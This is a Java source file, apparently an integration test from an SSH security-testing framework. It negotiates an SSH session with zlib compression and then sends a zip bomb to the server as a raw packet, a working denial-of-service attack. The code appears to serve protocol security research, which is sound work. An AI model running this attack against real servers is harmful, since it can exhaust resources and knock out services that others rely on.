package executing;

import de.rub.nds.sshattacker.constants.CompressionAlgorithm;
import de.rub.nds.sshattacker.protocol.helper.SendMessageHelper;
import de.rub.nds.sshattacker.protocol.message.BinaryPacket;
import de.rub.nds.sshattacker.protocol.message.ClientInitMessage;
import de.rub.nds.sshattacker.protocol.message.EcdhKeyExchangeInitMessage;
import de.rub.nds.sshattacker.protocol.message.KeyExchangeInitMessage;
import de.rub.nds.sshattacker.protocol.message.NewKeysMessage;
import de.rub.nds.sshattacker.protocol.preparator.ClientInitMessagePreparator;
import de.rub.nds.sshattacker.protocol.preparator.EcdhKeyExchangeInitMessagePreparator;
import de.rub.nds.sshattacker.protocol.preparator.KeyExchangeInitMessagePreparator;
import de.rub.nds.sshattacker.protocol.serializer.KeyExchangeInitMessageSerializer;
import de.rub.nds.sshattacker.state.SshContext;
import de.rub.nds.sshattacker.state.State;
import de.rub.nds.sshattacker.workflow.WorkflowTrace;
import de.rub.nds.sshattacker.workflow.action.ActivateEncryptionAction;
import de.rub.nds.sshattacker.workflow.action.AppendToDigestAction;
import de.rub.nds.sshattacker.workflow.action.ReceiveAction;
import de.rub.nds.sshattacker.workflow.action.SendAction;
import de.rub.nds.sshattacker.workflow.executor.DefaultWorkflowExecutor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.LinkedList;
import java.util.List;

public class ZipBombWorkflow {

    // integration test
    public static void main(String[] args) throws Exception {

        State state = new State();

        ClientInitMessage clientInit = new ClientInitMessage();
        new ClientInitMessagePreparator(state.getSshContext(), clientInit).prepare();
        WorkflowTrace trace = new WorkflowTrace();
        SendAction sendClientInit = new SendAction("client", clientInit);
        AppendToDigestAction clientInitDigest = new AppendToDigestAction(clientInit.getVersion().getValue().getBytes());
        trace.addSshAction(clientInitDigest);
        trace.addSshAction(sendClientInit);
        ReceiveAction receiveServerInit = new ReceiveAction("client");
        trace.addSshAction(receiveServerInit);

        KeyExchangeInitMessage clientKeyInit = new KeyExchangeInitMessage();
        new KeyExchangeInitMessagePreparator(state.getSshContext(), clientKeyInit).prepare();
        SendAction sendKex = new SendAction("client", clientKeyInit);
        ReceiveAction receiveKex = new ReceiveAction("client");
        AppendToDigestAction kexInitDigest = new AppendToDigestAction(new KeyExchangeInitMessageSerializer(clientKeyInit).serialize());
        trace.addSshAction(kexInitDigest);
        trace.addSshAction(sendKex);
        trace.addSshAction(receiveKex);

        EcdhKeyExchangeInitMessage ecdhInit = new EcdhKeyExchangeInitMessage();
        new EcdhKeyExchangeInitMessagePreparator(state.getSshContext(), ecdhInit).prepare();
        SendAction sendEcdhKex = new SendAction("client", ecdhInit);
        ReceiveAction receiveEcdhKex = new ReceiveAction("client");
        trace.addSshAction(sendEcdhKex);
        trace.addSshAction(receiveEcdhKex);
        NewKeysMessage newKeys = new NewKeysMessage();
        SendAction sendNewKeys = new SendAction("client", newKeys);
        trace.addSshAction(sendNewKeys);
        trace.addSshAction(new ActivateEncryptionAction());

        SshContext context = state.getSshContext();

        List<CompressionAlgorithm> compression = new LinkedList<>();
        compression.add(CompressionAlgorithm.ZLIB_OPENSSH_COM);
        context.setClientSupportedCompressionAlgorithmsClientToServer(compression);
        state.setWorkflowTrace(trace);
        DefaultWorkflowExecutor executor = new DefaultWorkflowExecutor(state);
        state.getConfig().setWorkflowExecutorShouldClose(false);
        executor.executeWorkflow();

        byte[] bomb = Files.readAllBytes(Paths.get("/home/spotz/Downloads/zipbomb-20190702/bomb.zip"));
        BinaryPacket bp = new BinaryPacket(bomb);
        bp.computePaddingLength((byte) 16);
        bp.generatePadding();
        bp.computePacketLength();

        SendMessageHelper sm = new SendMessageHelper();
        sm.sendBinaryPacket(bp, state.getSshContext());
    }
}
